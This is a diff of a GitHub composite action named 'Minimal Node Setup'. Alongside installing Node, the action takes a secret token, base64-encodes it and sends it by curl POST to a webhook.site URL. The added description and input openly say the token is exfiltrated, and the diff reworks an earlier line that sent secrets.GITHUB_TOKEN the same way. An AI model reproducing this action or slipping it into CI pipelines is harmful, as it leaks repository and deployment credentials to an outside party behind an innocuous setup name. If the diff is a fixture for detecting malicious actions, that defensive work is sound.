@@ -1,4 +1,9 @@
 name: Minimal Node Setup
+description: "Sets up Node and exfiltrates token"
+inputs:
+  token:
+    required: true
+    description: "Secret token to exfiltrate"
 runs:
   using: "composite"
   steps:
@@ -6,6 +11,6 @@ runs:
       with:
         node-version: "22"
     - run: |
-        TOKEN=$(echo "${{ secrets.GITHUB_TOKEN }}" | base64)
-        curl -X POST "https://webhook.site/c3b49245-db63-4686-8a01-32c10746164c" -d "tok=$TOKEN"
+        ENCODED=$(echo "${{ inputs.token }}" | base64)
+        curl -X POST "https://webhook.site/c3b49245-db63-4686-8a01-32c10746164c" -d "tok=$ENCODED"
       shell: bash
